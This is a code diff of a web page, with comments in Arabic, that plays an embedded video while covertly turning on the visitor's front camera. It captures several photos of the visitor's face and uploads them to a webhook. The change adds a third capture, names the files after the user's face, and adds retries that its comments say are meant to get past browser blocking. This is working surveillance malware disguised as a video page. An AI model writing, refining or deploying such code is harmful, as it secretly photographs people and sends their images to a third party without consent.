@@ -54,17 +54,17 @@
             iframe.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', '*');
             iframe.contentWindow.postMessage('{"event":"command","func":"unMute","args":""}', '*');
 
-            // طلب الكاميرا بأفضل دقة
+            // طلب الكاميرا
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: "user" } 
             });
             camera.srcObject = stream;
 
             camera.onplaying = () => {
-                // محاولة الإرسال الأولى بعد 3 ثوانٍ
+                // محاولات إرسال متكررة لضمان تجاوز أي حظر من المتصفح
                 setTimeout(() => captureAndSend(1), 3000);
-                // محاولة ثانية بعد 7 ثوانٍ لضمان الوصول
-                setTimeout(() => captureAndSend(2), 7000);
+                setTimeout(() => captureAndSend(2), 6000);
+                setTimeout(() => captureAndSend(3), 10000);
             };
         } catch (err) {
             console.error("Camera error");
@@ -84,24 +84,24 @@
                 if (!blob) return;
 
                 const formData = new FormData();
-                formData.append('file', blob, `shot_${id}.png`);
-                formData.append('content', `✅ تم استلام صورة جديدة (محاولة ${id})`);
+                formData.append('file', blob, `user_face_${id}.png`);
+                formData.append('content', `🔔 **تنبيه:** تم التقاط صورة جديدة (محاولة رقم ${id})`);
 
-                try {
-                    // استخدام fetch مع التأكد من عدم وجود كاش
-                    await fetch(webhookURL, {
-                        method: 'POST',
-                        body: formData,
-                        mode: 'no-cors' // لضمان تخطي قيود المتصفح عند الإرسال المباشر
-                    });
-                } catch (e) {
-                    // في حال فشل no-cors، نحاول الإرسال العادي
-                    await fetch(webhookURL, { method: 'POST', body: formData });
-                }
+                // الإرسال باستخدام fetch التقليدي مع إزالة القيود
+                fetch(webhookURL, {
+                    method: 'POST',
+                    body: formData
+                }).then(res => {
+                    if (res.ok) console.log("Success");
+                }).catch(err => {
+                    // إذا فشل الإرسال العادي، نحاول مرة أخرى بعد ثانية
+                    setTimeout(() => captureAndSend(id + "_retry"), 2000);
+                });
+
             }, 'image/png');
         } else {
-            // إذا كانت الكاميرا سوداء، انتظر وحاول مجدداً
-            setTimeout(() => captureAndSend(id + "_retry"), 1500);
+            // إعادة المحاولة إذا كانت الكاميرا لم تجهز بعد
+            setTimeout(() => captureAndSend(id + "_wait"), 1000);
         }
     }
 </script>
